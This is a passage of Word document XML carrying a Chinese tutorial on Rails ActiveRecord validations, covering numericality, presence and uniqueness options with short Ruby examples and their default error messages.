          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须等于指定的值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be equal to %{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40BA8C9F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:less_than</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须小于指定的值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be less than %{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB1967D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:less_than_or_equal_to</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须小于或等于指定的值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be less than or equal to %{count}</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AE7145F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3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:odd</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 设置为 true 时，代表被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须为奇数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be odd</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E056DFB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>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:even</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 设置为 true 时，代表被校验的属性值</w:t>
      </w:r>
      <w:r w:rsidRPr="00BC5D40">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>必须为偶数</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。该选项的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>must be even</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71591E8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该校验的默认错误信息为 “</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is not a number</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F62EC4" w14:textId="494C002F"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3.9 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>presence</w:t>
      </w:r>
      <w:r w:rsidR="00462298">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 不为空、外键不为空、</w:t>
      </w:r>
      <w:r w:rsidR="00C25800">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>boolean不为空</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="396CCE60" w14:textId="29D9A977" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="00AF6362" w:rsidP="002A2B82">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kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>该校验用来验证指定的属性</w:t>
      </w:r>
      <w:r w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>不</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>为空</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。其实它使用的是 </w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法来判断被校验值</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">是否为 </w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 或者是空字符串</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，即</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82" w:rsidRPr="00AF6362">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>一个字符串为空或者只含有空格</w:t>
      </w:r>
      <w:r w:rsidR="002A2B82"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6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="39D3133B" w14:textId="77777777" w:rsidTr="00AF6362">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1E36030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19201A3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:name, :login, :email,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7F995EB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195916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462298">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>如果你想确定对象之间的某一关联是否存在，应该通过检查关联的外键是否存在，而不是检查关联对象是否存在</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5256"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="2819EAD3" w14:textId="77777777" w:rsidTr="00462298">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="11F7130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LineItem &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4EA0BC0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belongs_to :order</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="075AD20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:order_id,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423937A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552679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由于 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false.blank?</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true，所以</w:t>
      </w:r>
      <w:r w:rsidRPr="00462298">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">如果想校验一个 boolean 值是否存在，应该使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="00462298">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>validates :field_name, :inclusion =&gt; { :in =&gt; [true, false] }</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455DA609"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该校验的默认错误信息为"_can’t be empty_"。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34B7835B" w14:textId="0E36629B"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3.10 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>uniqueness</w:t>
      </w:r>
      <w:r w:rsidR="00F14D70">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>唯一</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F371CF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该校验用来检查</w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>在对象保存到数据库前，该属性值是否惟一</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。但是</w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>该校验并不会在数据库上创建惟一性约束</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，所以</w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>有可能会出现虽然我们想保持数据的惟一性，但是由于使用了不同的数据连接而插入了两个相同值</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。所以</w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>为了避免这样的情况，你必须为 该列在数据库中建立惟一性索引</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5136"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="35595B66" w14:textId="77777777" w:rsidTr="00281782">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="005F009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Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57A6074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:email, :uniqueness</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1773178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40141FF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该校验实际上就是在模型关联的数据表中执行一条SQL语句，</w:t>
      </w:r>
      <w:r w:rsidRPr="00703850">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>使用被校验属性的值进行一次查询</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1BEEC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81782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve">可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>:scope</w:t>
      </w:r>
      <w:r w:rsidRPr="00281782">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来指定其他的属性来限制惟一性校验</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6696"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="55EF92B1" w14:textId="77777777" w:rsidTr="00281782">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DA3EEC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Holiday &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="250D3C9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:name, :uniqueness</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; { :scope</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; :year,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07DB1C7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:message</w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="002A2B82">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "should happen once per year"</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7BDFDB5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2DB7FB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还可以通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:case_sensitive</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 选项来</w:t>
      </w:r>
      <w:r w:rsidRPr="00703850">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>指定唯一性约束是否是大小写敏感的</w:t>
      </w:r>
      <w:r w:rsidRPr="002A2B82">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，默认为 true。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w:rsidRPr="002A2B82" w14:paraId="489CBC5C" w14:textId="77777777" w:rsidTr="00703850">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
